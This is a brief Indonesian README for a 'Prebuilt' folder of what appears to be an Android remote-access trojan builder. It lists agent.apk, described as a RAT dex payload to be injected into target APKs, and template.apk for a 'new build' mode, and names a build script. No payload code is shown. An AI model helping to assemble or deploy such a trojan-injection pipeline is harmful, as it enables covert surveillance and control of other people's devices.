# Prebuilt

Folder ini harus berisi dua APK sebelum pipeline build bisa jalan:

| File | Fungsi |
|------|--------|
| `agent.apk` | dex payload RAT, di-inject ke APK target |
| `template.apk` | APK kosong minimal untuk mode "Build Baru" |

Cara mengisi:

```bash
./scripts/build-agent.sh
